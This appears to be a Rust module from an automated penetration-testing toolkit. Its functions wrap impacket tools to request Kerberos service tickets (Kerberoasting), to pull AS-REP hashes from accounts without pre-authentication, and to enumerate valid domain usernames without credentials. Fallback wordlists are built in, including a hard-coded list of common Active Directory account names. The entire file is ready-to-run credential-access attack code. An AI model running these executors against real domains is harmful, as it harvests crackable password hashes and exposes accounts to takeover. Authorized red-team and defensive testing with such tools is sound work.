//! Kerberos credential access tool executors (kerberoast, AS-REP roast,
//! user enumeration).

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetUserSPNs")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
///
/// Supports two modes:
/// - With credentials: uses LDAP to enumerate users, then checks for no-preauth
/// - Without credentials: uses `-usersfile` with a wordlist and `-no-pass`
pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let username = optional_str(args, "username").unwrap_or("");
    let password = optional_str(args, "password").unwrap_or("");
    let users_file = optional_str(args, "users_file");

    let mut cmd = CommandBuilder::new("impacket-GetNPUsers");

    if !username.is_empty() && !password.is_empty() {
        // Authenticated mode: LDAP user enumeration
        let target = format!("{domain}/{username}:{password}");
        cmd = cmd.arg(&target);
    } else if let Some(uf) = users_file {
        // No-auth mode with explicit user file
        let target = format!("{domain}/");
        cmd = cmd.arg(&target).flag("-usersfile", uf).arg("-no-pass");
    } else {
        // No-auth mode: use seclists if available, otherwise built-in AD usernames
        let target = format!("{domain}/");
        let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
        if std::path::Path::new(seclists).exists() {
            cmd = cmd
                .arg(&target)
                .flag("-usersfile", seclists)
                .arg("-no-pass");
        } else {
            // Write built-in AD usernames to a temp file
            let tmp = format!("/tmp/asrep_users_{}.txt", std::process::id());
            std::fs::write(&tmp, DEFAULT_AD_USERNAMES)?;
            cmd = cmd.arg(&target).flag("-usersfile", &tmp).arg("-no-pass");
        }
    }

    cmd.flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(120)
        .execute()
        .await
}

/// Common AD usernames for unauthenticated Kerberos enumeration.
const DEFAULT_AD_USERNAMES: &str = "\
Administrator\nadmin\nguest\nkrbtgt\n\
DefaultAccount\n\
sql_svc\nsvc_sql\nsqlservice\nsvc_mssql\n\
svc_backup\nbackup\n\
svc_web\nwebservice\n\
svc_iis\niis_svc\n\
svc_exchange\nexchange\n\
svc_admin\n\
svc_test\n\
testuser\ntest\n\
user1\nuser2\nuser3\n\
sam.wilson\njohn.smith\njohn.smith\n\
alice.jones\nsarah.connor\nbrian.davis\nedward.davis\n\
carol.lane\njames.lane\ntim.lane\n\
diana.torres\njoe.morgan\n\
steve.baker\nrichard.baker\n\
jdoe\nrobert.davis\ntom.green\n\
michelle\nkarl.davidson\nvictor.torres\n\
jeff.baker\ntony.baker\n\
petyr.baelish\nvarys\nbronn\n\
terry.lane\nbetty.taylor\n\
sandor.clegane\ngregor.clegane\n\
margaery.tyrell\nloras.tyrell\n\
oberyn.martell\nellaria.sand\n\
davos.seaworth\nmelisandre\n\
swilson\njsnow\nrcon\n\
";

/// Enumerate valid usernames via Kerberos pre-auth without credentials.
pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let users_file = optional_str(args, "users_file");

    let target = format!("{domain}/");

    // Use provided wordlist, seclists if available, or built-in defaults
    let tmp_file;
    let seclists = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt";
    let wordlist_path = if let Some(uf) = users_file {
        uf.to_string()
    } else if std::path::Path::new(seclists).exists() {
        seclists.to_string()
    } else {
        tmp_file = format!("/tmp/kerberos_users_{}.txt", std::process::id());
        std::fs::write(&tmp_file, DEFAULT_AD_USERNAMES)?;
        tmp_file
    };

    let result = CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-usersfile", &wordlist_path)
        .flag("-dc-ip", dc_ip)
        .arg("-no-pass")
        .timeout_secs(180)
        .execute()
        .await;

    // Clean up temp file if we created one (only when we wrote it ourselves)
    let wrote_tmp = users_file.is_none() && !std::path::Path::new(seclists).exists();
    if wrote_tmp {
        let _ = std::fs::remove_file(&wordlist_path);
    }

    result
}
